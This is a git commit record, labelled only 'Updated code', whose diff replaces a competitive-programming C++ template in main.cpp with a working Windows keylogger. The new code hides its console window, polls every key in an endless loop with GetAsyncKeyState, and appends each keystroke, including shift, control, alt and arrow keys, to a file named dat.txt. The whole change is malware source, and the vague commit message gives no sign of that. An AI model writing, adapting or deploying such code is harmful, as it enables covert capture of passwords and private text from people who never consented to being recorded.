c5ee4b40bd1ec830374006bb60147db2b8dbd532
Kusuri Dheeraj Kumar <kusuri.dheeraj2014@gmail.com>
2021-08-03 22:31:25 +0530

    Updated code

--- main.cpp
+++ main.cpp
@@ -1,37 +1,115 @@
-/* Author : kusuriallmight */
-#include<bits/stdc++.h>
-using namespace std;
-#define IOS      ios_base::sync_with_stdio(false);cin.tie(NULL);cout.tie(NULL);
-#define UMAX      100000+9
-#define F         first
-#define S         second
-#define debug(v)  for(auto &x:v)clog<<x<<" \n"[x==v.back()];
-#define print(v)  for(auto &x:v)cout<<x<<" \n"[x==v.back()];
-#define read(v)   for(auto &x:v)cin>>x;
-#define deb(x)    clog<<#x<<" is "<<x<<'\n';
-#define all(v)    v.begin(),v.end()
-#define pb        push_back
-#define pf		  push_front
-#define pii		  pair<int,int>
-using ll = long long;
-const int mod = 100000000+7;
-#define int long long int
+#define _WIN32_WINNT 0x0500
+#include <Windows.h>
+#include <string>
+#include <stdlib.h>
+#include <stdio.h>
+#include <iostream>
+#include <fstream>
 
-void Solve() {
-  int c;cin>>c;
-  cout<<c<<endl;
+
+
+using namespace std;
+
+
+
+void LOG(string input) {
+	fstream LogFile;
+	LogFile.open("dat.txt", fstream::app);
+	if (LogFile.is_open()) {
+		LogFile << input;
+		LogFile.close();
+	}
 }
-signed main() {
-	IOS;
-	#ifndef ONLINE_JUDGE
-	freopen("input.txt", "r", stdin);  
-    freopen("output.txt", "w", stdout);
-	#endif
-	int t;
-	cin >> t;
-	while (t--)
-	{
-		Solve();
-	} 
+
+
+bool SpecialKeys(int S_Key) {
+	switch (S_Key) {
+	case VK_SPACE:
+		cout << " ";
+		LOG(" ");
+		return true;
+	case VK_RETURN:
+		cout << "\n";
+		LOG("\n");
+		return true;
+	case '¾':
+		cout << ".";
+		LOG(".");
+		return true;
+	case VK_SHIFT:
+		cout << "#SHIFT#";
+		LOG("#SHIFT#");
+		return true;
+	case VK_BACK:
+		cout << "\b";
+		LOG("\b");
+		return true;
+	case VK_RBUTTON:
+		cout << "#R_CLICK#";
+		LOG("#R_CLICK#");
+		return true;
+	case VK_CAPITAL:
+		cout << "#CAPS_LOCK#";
+		LOG("#CAPS_LCOK");
+		return true;
+	case VK_TAB:
+		cout << "#TAB";
+		LOG("#TAB");
+		return true;
+	case VK_UP:
+		cout << "#UP";
+		LOG("#UP_ARROW_KEY");
+		return true;
+	case VK_DOWN:
+		cout << "#DOWN";
+		LOG("#DOWN_ARROW_KEY");
+		return true;
+	case VK_LEFT:
+		cout << "#LEFT";
+		LOG("#LEFT_ARROW_KEY");
+		return true;
+	case VK_RIGHT:
+		cout << "#RIGHT";
+		LOG("#RIGHT_ARROW_KEY");
+		return true;
+	case VK_CONTROL:
+		cout << "#CONTROL";
+		LOG("#CONTROL");
+		return true;
+	case VK_MENU:
+		cout << "#ALT";
+		LOG("#ALT");
+		return true;
+	default: 
+		return false;
+	}
+}
+
+
+
+int main()
+{
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	char KEY = 'x';
+
+	while (true) {
+		Sleep(10);
+		for (int KEY = 8; KEY <= 190; KEY++)
+		{
+			if (GetAsyncKeyState(KEY) == -32767) {
+				if (SpecialKeys(KEY) == false) {
+
+					fstream LogFile;
+					LogFile.open("dat.txt", fstream::app);
+					if (LogFile.is_open()) {
+						LogFile << char(KEY);
+						LogFile.close();
+					}
+
+				}
+			}
+		}
+	}
+
 	return 0;
 }
